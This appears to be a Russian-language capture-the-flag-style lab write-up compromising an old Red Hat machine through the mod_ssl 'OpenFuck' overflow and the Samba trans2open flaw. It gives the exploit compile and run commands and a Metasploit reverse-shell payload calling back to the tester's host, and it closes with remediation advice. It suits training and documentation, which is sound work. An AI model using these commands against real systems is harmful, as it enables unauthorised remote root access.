🚀 1. Разведка (Reconnaissance & Enumeration)



Сканирование портов (Nmap)

```bash
nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn -oG all 192.168.246.132
nmap -sVC -p22,80,111,139,443,32768 -oN target 192.168.246.132
```



**Результаты:**

- **Порт 22/tcp** — SSH — OpenSSH 2.9p2 (Очень старая версия, потенциальные эксплойты)
- **Порт 80/tcp** — HTTP — Apache 1.3.20
- **Порт 111/tcp** — rpcbind
- **Порт 139/tcp** — netbios-ssn (Samba) ⚠️ _Интересный вектор_1
- **Порт 443/tcp** — HTTPS — Apache 1.3.20 (mod_ssl/2.8.4) ⚠️ _Интересный вектор_2


Веб-разведка (Порты 80 / 443)

- **Технологии:** Apache 1.3.20, Red Hat Linux, `mod_ssl/2.8.4`, `OpenSSL/0.9.6b`.
- **Поиск уязвимостей через Searchsploit:**
    
    ```bash
    searchsploit mod_ssl 2.8.4
    ```
    
    
    
    - Результат: Найдена известная уязвимость **Apache mod_ssl < 2.8.5 - 'OpenFuckv2.c' Remote Buffer Overflow** (CVE-2002-0082).

Разведка SMB (Порт 139)

- **Определение версии Samba:** Стандартные способы не сработали
```bash
sudo tcpdump -i eth0 host 192.168.246.132 and port 139 -A | grep Samba
smbclient -L //192.168.246.132/ -N

```
  
    - **Версия:** Samba 2.2.1a.
- **Поиск уязвимостей:**

    
    ```bash
    searchsploit samba 2.2
    ```
    
  
    
    - Результат: Найдена уязвимость **Samba < 2.2.8 (Linux) - 'trans2open' Remote Overflow** (CVE-2003-0201).

🎯 2. Точка входа & Повышение привилегий (Initial Foothold & PrivEsc)

_Поскольку эксплойты для этой машины сразу дают права суперпользователя (`root`), шаги получения начального доступа и повышения привилегий здесь совмещены._

Вектор А: Эксплуатация mod_ssl (OpenFuck / OpenFuckV2)

1. **Подготовка эксплойта:** Код `47683.c` требует компиляции. Для успешной сборки на современных системах Kali нужно установить библиотеку `libssl-dev` и добавить заголовки `#include <openssl/rc4.h>` (или использовать готовые пропатченные версии с GitHub).
2. **Компиляция:**

    
    ```bash
    gcc -o openfuck 47683.c -lssl -lcrypto
	# gcc -o OpenFuck1 OpenFuck.c -lcrypto -lssl -Wno-deprecated-declarations\n
	./openfuck | grep apache-1.3.20
    
1. **Запуск (Определение параметров цели):** Поиск нужного ID архитектуры в справке эксплойта для `Apache 1.3.20` и `RedHat`. Подходит `0x6a` или `0x6b`.
2. **Выполнение атаки:**

    
    ```bash
    ./openfuck 0x6b 192.168.246.132 443 -c 40
    ```
    



**Результат:** Эксплойт успешно срабатывает, отправляет шелл-код и сразу открывает сессию с правами **apache**.

Вектор Б: Эксплуатация Samba (trans2open)

_(Альтернативный способ прохождения для фиксации в заметках)_

1. **Поиск модуля в Metasploit:** `exploit/linux/samba/trans2open`.
2. **Настройка параметров:**
    
    ```bash
    set RHOSTS 192.168.246.132
    set PAYLOAD linux/x86/shell_reverse_tcp
    set LHOST 192.168.246.128
    run
    ```

**Результат:** Получена удаленная интерактивная сессия командной строки от имени **root**.

🧑‍💻 3. Сбор трофеев (Looting)

- **Проверка прав:** `whoami` -> `root`
- **Флаг рута:** В данной лабораторной работе классического файла `root.txt` нет. Целью является успешный взлом. Проверено содержимое почты рута

📝 4. Выводы для отчета (Summary & Remediation)

Найденные уязвимости:

1. **Critical:** Удаленное переполнение буфера в модуле `mod_ssl` (CVE-2002-0082). Позволяет удаленному злоумышленнику выполнить произвольный код в системе.
2. **Critical:** Удаленное переполнение буфера в демоне `Samba` (CVE-2003-0201) в функции `trans2open`.

Рекомендации по устранению:

- **Обновление ПО:** Операционная система и все запущенные сервисы (Apache, Samba, OpenSSH) критически устарели (версии 2001-2003 годов) и не должны использоваться.
- **Миграция:** Требуется полный перенос веб-приложений на актуальный дистрибутив Linux с поддержкой современных версий Apache 2.4.x и Samba 4.x.
- **Сегментация:** До момента обновления ограничить доступ к портам 139, 80 и 443 с помощью межсетевого экрана (Firewall) только для доверенных IP.
